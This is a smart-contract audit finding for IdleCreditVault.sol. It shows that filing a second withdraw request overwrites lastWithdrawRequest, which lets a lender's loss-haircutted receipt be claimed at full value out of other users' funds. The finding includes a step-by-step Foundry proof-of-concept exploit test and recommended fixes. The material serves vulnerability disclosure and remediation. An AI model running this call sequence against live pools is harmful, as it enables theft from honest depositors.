### Title
New withdraw request overwrites `lastWithdrawRequest`, orphaning a prior loss-adjusted receipt so it is later paid at par - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault` applies a stop-epoch loss haircut to pending withdraw receipts lazily at claim time, keyed only by `lastWithdrawRequest[_user]`. Because `requestWithdraw` overwrites `lastWithdrawRequest` on every new request and the funded-claim path pays the aggregate `withdrawsRequests[_user]` at par without applying older per-epoch haircuts, an unprivileged lender who holds a loss-adjusted receipt can file one additional withdraw request in a later epoch and then claim the haircutted receipt in full. The unfunded difference is paid out of strategy liquidity that belongs to other users.

### Finding Description
Bug-class mapping: CVE-2017-7046 is memory corruption where crafted input leaves stale/corrupted state that is later interpreted with wrong semantics. The analog here is stale receipt state: `lastWithdrawRequest[_user]` is a single-slot pointer that is corrupted (overwritten) by a crafted sequence of ordinary `requestWithdraw` calls, causing a loss-adjusted receipt to be reclassified as a fully-funded one.

Concretely:

1. `requestWithdraw` in `IdleCreditVault` records each request both in the aggregate `withdrawsRequests[_user]` and per-epoch in `withdrawsRequestsByEpoch[_user][currentEpoch]`, and unconditionally sets `lastWithdrawRequest[_user] = currentEpoch` [1](#0-0) .
2. When `stopEpochWithDuration` realizes a loss, `collectWithdrawFunds` transfers only `pendingBasis - pendingLoss` to the strategy, zeroes the aggregate `pendingWithdraws`, and stores `lossRecoveryPriceByEpoch[epochNumber]` — but it does not touch any per-user or per-epoch receipt state [2](#0-1) .
3. The haircut is applied only in `_claimLossAdjustedWithdrawRequest`, which looks up `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]` — i.e., only the *most recent* request epoch is checked [3](#0-2) .
4. `_claimFundedWithdrawRequest` then pays `withdrawsRequests[_user]` (the *sum across all epochs*) at par via `_transferFundedClaim`, and never consults `withdrawsRequestsByEpoch` or `lossRecoveryPriceByEpoch` for older epochs [4](#0-3) .
5. A second `requestWithdraw` is explicitly supported even while an older receipt is unclaimed (the code comment notes the user simply waits an extra epoch), and it overwrites `lastWithdrawRequest` [5](#0-4) .

Broken invariant: one receipt, one payout at its epoch's recovery price. After the sequence below, the epoch-E receipt is paid at `RECOVERY_FULL` instead of `lossRecoveryPriceByEpoch[E]`, and `withdrawsRequestsByEpoch[_user][E]` is never cleared — the loss that `collectWithdrawFunds` deducted from `pendingWithdraws` is silently re-funded to the attacker.

### Impact Explanation
Direct theft with quantified loss equal to `receiptBasis * (RECOVERY_FULL - lossRecoveryPriceByEpoch[E]) / RECOVERY_FULL`. The strategy only holds `basis * price` for the loss-adjusted epoch (the shortfall was never funded), so the excess is paid out of cash earmarked for other users' funded receipts / the reserve, producing a deficit for honest claimants — insolvency of the claim ledger by exactly the haircutted amount. Loss scales with the size of the attacker's pre-loss receipt; a lender controlling a large fraction of the tranche (e.g., via flash-funded deposits before the loss epoch) maximizes it.

### Likelihood Explanation
Requirements: the pool uses `stopEpochWithDuration` with `_lossAmount > 0` (an intended mechanism for realized losses without hard default), the attacker is a KYC-passing tranche holder with a pending withdraw receipt in that epoch, and `allowAA/BBWithdrawRequest` is enabled in the following buffer so a second `requestWithdraw` can be filed. No privileged cooperation is needed — the attacker only sequences their own calls around honest manager `startEpoch`/`stopEpochWithDuration` calls. Every guard checked (`_onlyIdleCDO`, epoch maturity check `epochNumber > lastWithdrawRequest`, `pendingClaims` gating) still passes because the overwritten `lastWithdrawRequest` points to the newer, fully-funded epoch.

### Recommendation
Apply per-epoch recovery at claim time for all receipt epochs, not just `lastWithdrawRequest`. Options: iterate/clear each entry in `withdrawsRequestsByEpoch[_user]` applying `lossRecoveryPriceByEpoch[e]` when nonzero; or have `collectWithdrawFunds` permanently record the haircut per receipt (e.g., store the funded basis rather than the request basis); at minimum, have `_claimFundedWithdrawRequest` subtract any `lossRecoveryPriceByEpoch`-covered basis before paying at par, and clear `withdrawsRequestsByEpoch` entries in the funded path to prevent stale basis reuse.

### Proof of Concept
Foundry fork test sketch (pattern follows `test/foundry/IdleCreditVault.t.sol` helpers):

```solidity
function testLossAdjustedReceiptPaidAtParAfterNewRequest() external {
    // setup: 10% apr, AA+BB deposits; attacker is a KYC'd lender
    uint256 amount = 10_000 * ONE_SCALE;
    address attacker = makeAddr("attacker");
    _depositWithUser(attacker, amount, true);
    _depositWithUser(makeAddr("victim"), amount, true);

    // epoch 0 runs and stops; buffer of epoch 1 (epochNumber == 1)
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr, _expectedFundsEndEpoch());

    // attacker files withdraw request -> lastWithdrawRequest = 1, basis X
    vm.prank(attacker);
    uint256 basisX = cdoEpoch.requestWithdraw(0, address(AAtranche));

    // epoch 1 runs; manager stops with a realized loss => lossRecoveryPriceByEpoch[1] = p < 1
    _startEpochAndCheckPrices(1);
    uint256 pendingBasis = strategy.pendingWithdraws();          // == basisX
    uint256 activeBasis  = cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest();
    uint256 loss = (activeBasis + pendingBasis) / 2;             // ~50% loss
    (uint256 pendingToFund,) = strategy.previewLossAdjustedWithdrawFunds(loss);
    uint256 repay = cdoEpoch.expectedEpochInterest() + pendingToFund;
    deal(defaultUnderlying, borrower, repay);
    vm.prank(borrower); underlying.approve(address(cdoEpoch), repay);
    uint256 duration = cdoEpoch.epochDuration();
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(10e18, 0, duration, loss);    // epochNumber -> 2, strategy gets only basisX*p for epoch-1 receipt

    // buffer of epoch 2: attacker files a second, small request -> lastWithdrawRequest = 2
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(ONE_TRANCHE, address(AAtranche));   // basisY = dust

    // epoch 2 runs and stops cleanly; borrower funds basisY
    _startEpochAndCheckPrices(2);
    _stopEpochAndCheckPrices(2, initialProvidedApr, _expectedFundsEndEpoch()); // epochNumber -> 3

    // claim: _claimLossAdjustedWithdrawRequest reads lossRecoveryPriceByEpoch[2] == 0 and skips;
    // _claimFundedWithdrawRequest pays withdrawsRequests[attacker] = basisX + basisY at PAR
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();

    uint256 price = strategy.lossRecoveryPriceByEpoch(1);
    assertApproxEqAbs(
        underlying.balanceOf(attacker) - balPre,
        basisX + basisY,                              // paid at par
        10,
        "loss-adjusted receipt paid unhaircut"
    );
    // strategy received only basisX*price/RECOVERY_FULL + basisY -> deficit = basisX*(1-price)
    assertGt(basisX + basisY, basisX * price / 1e18 + basisY, "attacker overpaid from other users' funds");
}
```

Key assertion: `withdrawsRequestsByEpoch[attacker][1]` remains nonzero and `lossRecoveryPriceByEpoch[1]` was never applied, while the strategy's cash for that epoch was only `basisX * price`.

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L282-294)
```text
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L323-328)
```text
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L338-349)
```text
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L411-425)
```text
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L789-800)
```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
```
